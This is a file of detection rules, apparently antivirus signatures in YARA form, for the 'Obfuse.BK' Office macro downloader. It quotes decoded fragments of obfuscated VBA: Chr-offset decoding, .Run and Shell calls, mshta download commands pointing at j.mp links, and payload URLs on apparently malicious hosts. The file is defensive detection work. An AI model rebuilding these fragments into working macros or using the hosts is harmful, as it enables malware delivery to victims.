
rule TrojanDownloader_O97M_Obfuse_BK_MTB{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {41 76 34 67 73 69 50 6c 5f 33 2e 67 6c 76 67 33 58 49 74 70 73 41 4c 43 75 38 37 5f 67 70 32 4b 38 41 48 65 65 35 69 6d } //01 00  Av4gsiPl_3.glvg3XItpsALCu87_gp2K8AHee5im
		$a_01_1 = {6d 6b 5f 6c 6c 20 3d 20 43 68 72 28 68 66 20 2d 20 36 31 29 } //01 00  mk_ll = Chr(hf - 61)
		$a_01_2 = {49 6d 20 3d 20 49 6d 20 26 } //00 00  Im = Im &
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {70 4c 5f 45 48 78 6d 57 7a 5f 56 43 44 5f 44 77 58 57 6f 2e 4c 67 5f 4f 5f 71 66 4f 4b 65 5a 68 61 47 68 46 4a 47 66 51 6c 48 74 42 35 } //01 00  pL_EHxmWz_VCD_DwXWo.Lg_O_qfOKeZhaGhFJGfQlHtB5
		$a_01_1 = {67 66 5f 39 20 3d 20 43 68 72 28 61 73 5f 77 20 2d 20 34 33 29 } //01 00  gf_9 = Chr(as_w - 43)
		$a_01_2 = {2e 52 75 6e 28 } //00 00  .Run(
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_3{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {2e 52 75 6e 28 49 42 53 59 5f 61 6c 34 6d 79 73 64 44 31 72 4d 4a 4a 4c 38 75 5f 47 58 65 65 5f 4b 6a 6e 67 4e 4d 5a 72 } //01 00  .Run(IBSY_al4mysdD1rMJJL8u_GXee_KjngNMZr
		$a_01_1 = {5a 53 20 3d 20 5a 53 20 26 20 } //01 00  ZS = ZS & 
		$a_01_2 = {6a 5f 5f 5f 68 20 3d 20 43 68 72 28 6e 5f 5f 5f 6f 20 2d 20 37 37 29 } //00 00  j___h = Chr(n___o - 77)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_4{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {7a 75 51 6b 51 78 75 4e 62 35 44 5f 52 57 2e 6f 69 4b 70 4a 58 48 47 41 74 64 5a 59 52 68 57 6e 35 35 44 } //01 00  zuQkQxuNb5D_RW.oiKpJXHGAtdZYRhWn55D
		$a_01_1 = {6d 78 63 5f 65 72 20 3d 20 43 68 72 28 6e 76 20 2d 20 36 34 29 } //01 00  mxc_er = Chr(nv - 64)
		$a_01_2 = {2e 52 75 6e 28 } //01 00  .Run(
		$a_01_3 = {6b 4a 20 3d 20 6b 4a 20 26 } //00 00  kJ = kJ &
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_5{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {43 6f 79 73 5f 69 2e 75 4e 50 5f 66 5f 6b 5f 75 67 64 4a 62 5f 6b 39 46 48 6b 6a } //01 00  Coys_i.uNP_f_k_ugdJb_k9FHkj
		$a_01_1 = {68 6a 64 61 20 3d 20 43 68 72 28 64 73 20 2d 20 33 30 29 } //01 00  hjda = Chr(ds - 30)
		$a_01_2 = {2e 52 75 6e 28 6d 72 44 5f 52 5f 61 4c 75 65 46 34 2c 20 76 42 5a 5f 5f 5f 6a 55 34 4b 50 55 54 77 29 } //00 00  .Run(mrD_R_aLueF4, vBZ___jU4KPUTw)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_6{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {45 35 45 4e 5f 2e 53 6f 64 55 75 78 5f 52 45 70 5f 5f 5a 5f 41 52 43 71 79 50 } //01 00  E5EN_.SodUux_REp__Z_ARCqyP
		$a_01_1 = {76 63 62 20 3d 20 43 68 72 28 61 73 64 20 2d 20 37 29 } //01 00  vcb = Chr(asd - 7)
		$a_01_2 = {2e 52 75 6e 28 4f 79 6e 49 77 74 34 4e 59 73 58 51 48 55 2c 20 66 75 37 55 68 47 61 55 70 41 68 52 61 72 5a 45 49 29 } //00 00  .Run(OynIwt4NYsXQHU, fu7UhGaUpAhRarZEI)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_7{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {74 70 6b 6d 20 3d 20 74 70 6b 6d 20 26 } //01 00  tpkm = tpkm &
		$a_01_1 = {2e 52 75 6e 28 69 64 69 6d 71 73 7a 73 69 66 79 6e 74 2c 20 72 74 63 63 69 62 6e 75 67 78 71 76 74 63 77 74 69 6c 72 62 67 71 68 63 77 6b 65 29 } //01 00  .Run(idimqszsifynt, rtccibnugxqvtcwtilrbgqhcwke)
		$a_01_2 = {64 5f 5f 61 73 20 3d 20 43 68 72 57 28 6c 5f 5f 6b 20 2d 20 36 32 29 } //00 00  d__as = ChrW(l__k - 62)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_8{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {55 5f 5f 32 37 6a 57 74 32 2e 79 5f 4f 71 77 44 39 4f 61 61 6b 5f 54 4b 4b 41 4a 77 68 6b } //01 00  U__27jWt2.y_OqwD9Oaak_TKKAJwhk
		$a_01_1 = {68 6a 64 61 20 3d 20 43 68 72 28 64 73 20 2d 20 33 30 29 } //01 00  hjda = Chr(ds - 30)
		$a_01_2 = {2e 52 75 6e 28 4c 57 56 6f 5a 69 42 5a 5f 4e 5f 2c 20 48 33 6c 65 58 67 73 79 4b 59 5f 45 79 54 6d 63 29 } //00 00  .Run(LWVoZiBZ_N_, H3leXgsyKY_EyTmc)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_9{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {57 62 51 5a 72 6e 38 49 34 4b 5f 5a 35 33 5f 4a 55 78 53 4d 4f 75 4f 70 33 38 7a 39 5f 2e 6a 74 73 67 39 76 50 5f 36 6a 37 44 49 6f 4a 6e 48 6d 45 69 48 34 50 61 4d } //01 00  WbQZrn8I4K_Z53_JUxSMOuOp38z9_.jtsg9vP_6j7DIoJnHmEiH4PaM
		$a_01_1 = {6d 6b 5f 6c 6c 20 3d 20 43 68 72 28 68 66 20 2d 20 36 31 29 } //01 00  mk_ll = Chr(hf - 61)
		$a_01_2 = {54 54 20 3d 20 54 54 20 26 } //00 00  TT = TT &
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_10{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {6d 37 4b 5f 5a 64 4b 57 59 77 44 68 69 61 4d 53 5f 68 34 5f 44 38 59 6d 5f 39 39 2e 57 34 36 5f 6d 57 65 67 4b 53 56 7a 5f 77 75 5f 46 32 6f 56 54 55 6a 49 55 4b 45 51 45 } //01 00  m7K_ZdKWYwDhiaMS_h4_D8Ym_99.W46_mWegKSVz_wu_F2oVTUjIUKEQE
		$a_01_1 = {71 38 20 3d 20 71 38 20 26 20 } //01 00  q8 = q8 & 
		$a_01_2 = {6d 6b 5f 6c 6c 20 3d 20 43 68 72 28 68 66 20 2d 20 36 31 29 } //00 00  mk_ll = Chr(hf - 61)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_11{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 01 00 "
		
	strings :
		$a_03_0 = {3d 20 6f 70 6f 70 6f 20 2b 20 6d 6b 73 6d 64 61 73 20 2b 20 6a 64 73 61 6b 64 61 77 20 2b 20 22 74 61 20 68 74 74 70 3a 2f 2f 25 32 30 25 32 30 40 6a 2e 6d 70 2f 90 02 1e 22 90 00 } //01 00 
		$a_01_1 = {3d 20 22 6d 22 } //01 00  = "m"
		$a_01_2 = {3d 20 22 73 22 } //01 00  = "s"
		$a_01_3 = {3d 20 22 68 22 } //01 00  = "h"
		$a_01_4 = {53 68 65 6c 6c } //00 00  Shell
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_12{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 66 65 69 78 62 74 6f 20 2b 20 73 6f 31 20 2b 20 68 6f 32 20 2b 20 22 74 61 20 68 74 74 70 3a 2f 2f 25 32 30 25 32 30 40 6a 2e 6d 70 2f 73 64 68 6a 61 36 37 78 7a 68 6a 64 61 73 22 } //01 00  = feixbto + so1 + ho2 + "ta http://%20%20@j.mp/sdhja67xzhjdas"
		$a_01_1 = {3d 20 22 6d 22 } //01 00  = "m"
		$a_01_2 = {3d 20 22 73 22 } //01 00  = "s"
		$a_01_3 = {3d 20 22 68 22 } //01 00  = "h"
		$a_01_4 = {53 68 65 6c 6c } //00 00  Shell
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_13{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {79 73 62 6a 49 42 49 54 6c 48 38 53 4b 4c 62 49 42 5f 4b 2e 41 67 50 59 35 46 65 51 68 5f 65 44 75 79 36 35 75 76 54 75 45 64 } //01 00  ysbjIBITlH8SKLbIB_K.AgPY5FeQh_eDuy65uvTuEd
		$a_01_1 = {68 67 72 74 20 3d 20 43 68 72 28 68 67 66 20 2d 20 37 29 } //01 00  hgrt = Chr(hgf - 7)
		$a_01_2 = {3d 20 22 57 73 63 72 69 70 74 2e 53 68 65 6c 6c 22 } //01 00  = "Wscript.Shell"
		$a_01_3 = {69 52 20 3d 20 69 52 20 26 } //00 00  iR = iR &
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_14{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {4c 65 58 6d 61 50 65 61 4b 2e 6f 74 39 5f 59 6c 51 5f 4e 77 37 6c 56 42 75 70 66 5f 50 54 } //01 00  LeXmaPeaK.ot9_YlQ_Nw7lVBupf_PT
		$a_01_1 = {68 6a 64 61 20 3d 20 43 68 72 28 64 73 20 2d 20 33 30 29 } //01 00  hjda = Chr(ds - 30)
		$a_01_2 = {2e 52 75 6e 28 44 67 69 39 5f 42 63 75 67 55 59 74 36 5f 2c 20 47 4a 57 37 5a 5f 53 42 72 31 5f 57 78 67 4a 41 59 33 63 55 45 29 } //00 00  .Run(Dgi9_BcugUYt6_, GJW7Z_SBr1_WxgJAY3cUE)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_15{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 01 00 "
		
	strings :
		$a_01_0 = {78 73 5f 5f 5f 5f 5f 47 20 3d 20 43 68 72 57 28 6d 5f 5f 5f 5f 5f 6e 20 2d 20 36 39 29 } //01 00  xs_____G = ChrW(m_____n - 69)
		$a_01_1 = {2e 52 75 6e 28 6c 63 77 66 69 64 78 6b 62 6c 66 6b 62 6f 6b 76 6a 77 6c 71 71 72 64 68 76 6b 77 65 66 6e 71 6c 67 79 68 2c 20 6e 6f 66 70 70 78 75 75 6a 78 7a 63 73 6c 6a 6b 62 6b 62 74 61 75 6b 6a 62 78 78 6b 6a 6d 77 65 29 } //00 00  .Run(lcwfidxkblfkbokvjwlqqrdhvkwefnqlgyh, nofppxuujxzcsljkbkbtaukjbxxkjmwe)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_16{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {50 5f 71 41 6c 7a 72 39 78 57 54 6a 35 2e 4f 68 58 50 6b 4a 32 73 6f 71 70 75 35 52 47 74 52 76 44 33 61 39 6b 64 } //01 00  P_qAlzr9xWTj5.OhXPkJ2soqpu5RGtRvD3a9kd
		$a_01_1 = {2e 52 75 6e 28 76 41 77 6b 37 52 75 72 4e 72 53 44 61 36 4f 4d 50 72 51 52 57 64 44 42 43 59 34 63 77 6b 35 64 45 6f 57 56 66 65 6a 42 6e 6d 37 6e 6f 5a 64 5f 43 } //01 00  .Run(vAwk7RurNrSDa6OMPrQRWdDBCY4cwk5dEoWVfejBnm7noZd_C
		$a_01_2 = {43 4c 20 3d 20 43 4c 20 26 } //00 00  CL = CL &
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_17{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {4c 77 57 6e 74 51 77 64 64 59 6e 78 75 76 5a 69 5a 73 5f 36 54 33 2e 75 5f 58 48 74 54 4d 61 76 46 69 6d 54 62 45 4e 51 4c 4e 75 41 7a 4a 42 4e 41 35 53 52 } //01 00  LwWntQwddYnxuvZiZs_6T3.u_XHtTMavFimTbENQLNuAzJBNA5SR
		$a_01_1 = {68 5f 75 69 6b 20 3d 20 43 68 72 28 76 66 20 2d 20 35 30 29 } //01 00  h_uik = Chr(vf - 50)
		$a_01_2 = {2e 52 75 6e 28 6b 66 4a 68 38 4e 39 42 73 4a 69 51 36 6a 51 73 39 72 52 67 6e 53 50 64 5f } //00 00  .Run(kfJh8N9BsJiQ6jQs9rRgnSPd_
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_18{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {61 6e 6f 20 3d 20 61 6e 6f 20 26 20 } //01 00  ano = ano & 
		$a_01_1 = {2e 52 75 6e 28 77 76 77 6c 6e 6d 6c 73 64 79 76 61 66 65 66 76 75 64 6e 6a 62 6e 73 65 61 64 74 6d 2c 20 66 6e 6c 62 6c 67 6f 67 7a 6a 78 75 68 7a 62 69 76 6f 72 66 78 77 64 75 76 6e 65 6b 77 77 67 6f 72 6a 74 66 78 78 71 29 } //01 00  .Run(wvwlnmlsdyvafefvudnjbnseadtm, fnlblgogzjxuhzbivorfxwduvnekwwgorjtfxxq)
		$a_01_2 = {3d 20 43 68 72 28 62 67 66 62 67 20 2d 20 31 31 34 29 } //00 00  = Chr(bgfbg - 114)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_19{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 52 65 70 6c 61 63 65 28 6e 45 41 61 63 79 57 79 70 4e 47 6e 73 6f 5f 55 71 51 4b 59 2e } //01 00  = Replace(nEAacyWypNGnso_UqQKY.
		$a_01_1 = {3d 20 49 73 44 61 74 65 28 49 73 4e 75 6d 65 72 69 63 } //01 00  = IsDate(IsNumeric
		$a_01_2 = {3d 20 6e 45 41 61 63 79 57 79 70 4e 47 6e 73 6f 5f 55 71 51 4b 59 2e 6d 66 62 5a 48 6d 61 56 66 74 } //01 00  = nEAacyWypNGnso_UqQKY.mfbZHmaVft
		$a_01_3 = {2e 53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 43 4c 6e 67 28 28 } //00 00  .ShowWindow = CLng((
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_20{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {49 48 76 55 52 50 49 38 34 6b 50 35 5f 2e 6f 54 6b 48 36 5a 49 34 45 4f 75 5a 4b 33 72 5f 74 4f 5a 4c } //01 00  IHvURPI84kP5_.oTkH6ZI4EOuZK3r_tOZL
		$a_01_1 = {44 5f 5f 53 20 3d 20 43 68 72 28 53 41 20 2d 20 31 30 30 29 } //01 00  D__S = Chr(SA - 100)
		$a_01_2 = {2e 52 75 6e 28 6a 6c 77 4a 71 57 48 38 7a 34 39 49 78 52 47 4d 33 54 6f 45 75 62 53 44 63 38 6b 67 5f 5a 4b 77 6e 4e 4d 67 77 75 57 67 57 67 57 31 6a 42 31 70 } //00 00  .Run(jlwJqWH8z49IxRGM3ToEubSDc8kg_ZKwnNMgwuWgWgW1jB1p
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_21{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 4e 6e 55 78 73 2e 72 4c 48 4c 56 28 79 46 78 67 2c 20 79 46 78 67 32 29 } //01 00  = NnUxs.rLHLV(yFxg, yFxg2)
		$a_01_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 64 66 6a 6b 64 73 66 28 29 20 2b 20 6b 6c 73 64 6b 28 29 20 2b 20 77 6c 66 66 66 28 29 29 } //01 00  = CreateObject(dfjkdsf() + klsdk() + wlfff())
		$a_01_2 = {2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 22 50 22 20 2b 20 6e 31 2c 20 41 32 2c 20 22 22 2c 20 22 22 2c 20 30 } //00 00  .ShellExecute "P" + n1, A2, "", "", 0
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_22{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 01 00 "
		
	strings :
		$a_03_0 = {3d 20 53 68 65 6c 6c 28 22 22 20 2b 20 22 6d 22 20 2b 20 22 73 22 20 2b 20 22 68 74 61 2e 65 78 65 20 68 74 74 70 73 3a 5c 5c 25 34 30 25 34 30 22 20 2b 20 22 25 34 30 25 22 20 2b 20 22 34 30 40 6a 2e 6d 22 20 2b 20 22 70 5c 22 20 2b 20 22 90 02 0a 22 20 2b 20 22 90 02 0a 22 2c 20 34 29 90 00 } //01 00 
		$a_01_1 = {53 75 62 20 41 75 74 6f 5f 43 6c 6f 73 65 28 29 } //00 00  Sub Auto_Close()
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_23{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 4d 73 78 6d 6c 32 2e 44 4f 4d 44 6f 63 75 6d 65 6e 74 2e 33 2e 30 22 29 } //01 00  = CreateObject("Msxml2.DOMDocument.3.0")
		$a_01_1 = {44 43 55 47 7a 55 2e 4c 6f 61 64 20 22 68 74 74 70 3a 2f 2f 6d 6f 6f 6e 73 68 69 6e 65 2d 6d 68 74 2e 62 65 73 74 2f 63 68 72 6f 6d 65 2e 6a 70 67 22 } //01 00  DCUGzU.Load "http://moonshine-mht.best/chrome.jpg"
		$a_01_2 = {2e 74 72 61 6e 73 66 6f 72 6d 4e 6f 64 65 20 28 44 43 55 47 7a 55 29 } //00 00  .transformNode (DCUGzU)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_24{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {53 33 56 33 4f 4f 62 72 64 31 72 5f 6c 34 6d 6c 38 37 75 63 54 56 41 78 62 72 71 2e 79 61 41 79 75 52 4d 79 44 38 59 5a 76 42 5f 69 6b 59 6e 35 } //01 00  S3V3OObrd1r_l4ml87ucTVAxbrq.yaAyuRMyD8YZvB_ikYn5
		$a_01_1 = {44 5f 5f 53 20 3d 20 43 68 72 28 53 41 20 2d 20 31 30 30 29 } //01 00  D__S = Chr(SA - 100)
		$a_01_2 = {2e 52 75 6e 28 50 62 62 6e 5a 5f 5f 4b 68 53 41 4d 54 33 48 5f 6e 6c 35 7a 39 77 77 51 4b 63 49 75 44 4d 55 47 6b 72 77 7a 32 68 43 4e } //00 00  .Run(PbbnZ__KhSAMT3H_nl5z9wwQKcIuDMUGkrwz2hCN
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_25{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {46 75 6e 63 74 69 6f 6e 20 62 5f 5f 5f 76 28 64 73 20 41 73 20 49 6e 74 65 67 65 72 29 } //01 00  Function b___v(ds As Integer)
		$a_01_1 = {69 4b 6a 58 79 78 4e 67 50 55 5a 58 2e 43 69 75 7a 69 74 4f 4b 54 45 62 4f 67 6a 4d 36 5f 59 56 5f 6e 47 53 6b 76 6d 37 5f 79 } //01 00  iKjXyxNgPUZX.CiuzitOKTEbOgjM6_YV_nGSkvm7_y
		$a_01_2 = {2e 52 75 6e 28 77 4f 5f 50 44 71 47 57 52 59 67 58 7a 36 36 39 75 62 59 7a 6a 5f 4e 4d 4e 61 57 73 4d 53 45 31 31 58 65 77 33 57 } //00 00  .Run(wO_PDqGWRYgXz669ubYzj_NMNaWsMSE11Xew3W
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_26{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 01 00 "
		
	strings :
		$a_01_0 = {4b 69 65 50 51 44 61 78 70 2e 4f 70 65 6e 20 6b 6f 4e 77 38 4d 41 72 4f 2c 20 4b 4d 68 6f 73 76 66 6e 62 2c 20 46 61 6c 73 65 2c 20 22 75 73 65 72 6e 61 6d 65 22 2c 20 22 50 61 73 73 77 6f 72 64 22 } //01 00  KiePQDaxp.Open koNw8MArO, KMhosvfnb, False, "username", "Password"
		$a_01_1 = {3d 20 22 68 74 74 70 73 3a 2f 2f 67 68 67 68 67 68 66 68 66 68 66 68 2e 30 30 30 77 65 62 68 6f 73 74 61 70 70 2e 63 6f 6d 2f 44 48 4c 20 51 41 2d 54 72 61 63 6b 65 72 2e 67 69 66 22 } //00 00  = "https://ghghghfhfhfh.000webhostapp.com/DHL QA-Tracker.gif"
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_27{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {78 64 72 63 34 53 72 75 31 48 52 4c 65 65 63 75 44 4e 77 6e 78 32 51 34 61 2e 72 44 75 49 71 5f 41 6c 5f 32 6b 41 5f 43 35 76 32 70 5f 62 72 72 74 } //01 00  xdrc4Sru1HRLeecuDNwnx2Q4a.rDuIq_Al_2kA_C5v2p_brrt
		$a_01_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 47 69 73 50 35 41 4a 31 33 4e 6e 5f 55 59 37 34 79 39 51 73 59 58 52 45 52 74 42 58 38 56 38 7a 41 52 58 35 6a 55 } //01 00  = CreateObject(GisP5AJ13Nn_UY74y9QsYXRERtBX8V8zARX5jU
		$a_01_2 = {2e 52 75 6e 28 74 48 64 41 6c 41 31 69 4a 4e 72 4d 55 51 5a 4e } //00 00  .Run(tHdAlA1iJNrMUQZN
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_28{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 52 65 70 6c 61 63 65 28 4c 5f 5f 52 62 57 5f 61 4e 41 75 78 59 4f 5f 61 79 2e } //01 00  = Replace(L__RbW_aNAuxYO_ay.
		$a_01_1 = {4f 70 65 6e 20 41 70 70 6c 69 63 61 74 69 6f 6e 2e 41 63 74 69 76 65 57 6f 72 6b 62 6f 6f 6b 2e 50 61 74 68 } //01 00  Open Application.ActiveWorkbook.Path
		$a_01_2 = {71 5a 48 6d 71 57 76 7a 56 2e 78 46 44 5f 69 6b 5f 5a 58 41 66 77 63 59 79 62 57 50 73 48 46 6a 48 5a 65 4e 44 } //01 00  qZHmqWvzV.xFD_ik_ZXAfwcYybWPsHFjHZeND
		$a_01_3 = {2e 53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 43 4c 6e 67 28 28 } //00 00  .ShowWindow = CLng((
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_29{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 41 63 74 69 76 65 43 65 6c 6c 2e 4f 66 66 73 65 74 28 69 43 2c 20 31 29 2e 56 61 6c 75 65 } //01 00  = ActiveCell.Offset(iC, 1).Value
		$a_01_1 = {3d 20 55 73 65 72 46 6f 72 6d 32 2e 46 72 61 6d 65 32 2e 54 61 67 } //01 00  = UserForm2.Frame2.Tag
		$a_01_2 = {53 68 65 6c 6c 4f 62 6a 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 78 2c 20 79 79 79 } //01 00  ShellObj.ShellExecute x, yyy
		$a_01_3 = {50 72 69 76 61 74 65 20 53 75 62 20 55 73 65 72 46 6f 72 6d 5f 43 6c 69 63 6b 28 29 } //01 00  Private Sub UserForm_Click()
		$a_01_4 = {53 6c 65 65 70 20 32 30 30 30 } //00 00  Sleep 2000
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_30{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 52 65 70 6c 61 63 65 28 6d 5f 52 75 78 59 50 42 53 6b 4c 41 45 6d 51 47 73 74 6f 52 76 59 5f 6c 58 57 70 50 52 4d 2e } //01 00  = Replace(m_RuxYPBSkLAEmQGstoRvY_lXWpPRM.
		$a_01_1 = {4f 70 65 6e 20 41 70 70 6c 69 63 61 74 69 6f 6e 2e 41 63 74 69 76 65 57 6f 72 6b 62 6f 6f 6b 2e 50 61 74 68 } //01 00  Open Application.ActiveWorkbook.Path
		$a_01_2 = {3d 20 46 79 43 4b 70 66 64 55 53 58 67 74 78 6e 5f 56 58 68 2e 70 6a 5f 63 71 7a 68 } //01 00  = FyCKpfdUSXgtxn_VXh.pj_cqzh
		$a_01_3 = {2e 53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 43 4c 6e 67 28 28 } //00 00  .ShowWindow = CLng((
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_31{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 52 65 70 6c 61 63 65 28 50 63 71 77 73 5f 4f 46 6d 55 49 73 6a 69 62 59 55 6b 2e } //01 00  = Replace(Pcqws_OFmUIsjibYUk.
